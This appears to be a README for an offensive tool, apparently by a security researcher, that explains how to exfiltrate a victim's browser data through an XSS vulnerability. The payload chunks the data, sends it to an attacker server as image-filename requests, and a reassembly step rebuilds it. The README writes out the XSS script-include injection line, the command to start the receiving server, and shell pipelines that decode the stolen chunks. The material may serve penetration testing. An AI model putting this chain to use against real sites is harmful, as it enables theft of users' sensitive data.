# XSS-Data-Exfil
Sample code for exfiltrating data through an XSS vulnerability. XSS Payload retrieves sensitive data in victim's browser, then breaks it into chunks. Sends those chunks out as image requests (data in image filename). Example commands and python script to put the original data back together. 

Blog post with screenshots and walkthrough here:
https://www.trustedsec.com/blog/simple-data-exfiltration-through-xss/


Basically you tailor the exfilPayload.js file to grab the sensitive data your victim has access to. 

Then in you pull that JavaScript file into the browswer by doing a script include in the XSS vulnerability:
<script src="ht<span>tp://127.0.0.1/exfilPayload.js"></script>

Start up a python HTTP server in the directory whwere exfilPayload.js is:
python -m SimpleHTTPServer 80

The exfilePayload.js will send to that same server the chunks of the data being exfiltrated. 

Copy those requests into a text file, clean it up with:
grep '/exfil/' exfilledData.txt | awk -F'/exfil/' '{print $2}' | awk -F'/' '{print $1 " " $2}' | awk -F'.jpg' '{print $1}' | while read i; do echo $i ; done > exfilledDataCleaned.txt

Then use the python script in this repo.

Then you can put the chunks back together finally with:
for file in ./{0..225}.chunk; do cat $file | base64 -d; done > restoredSuperSecretData.html

The blog post should make it clearer. 

@hoodoer
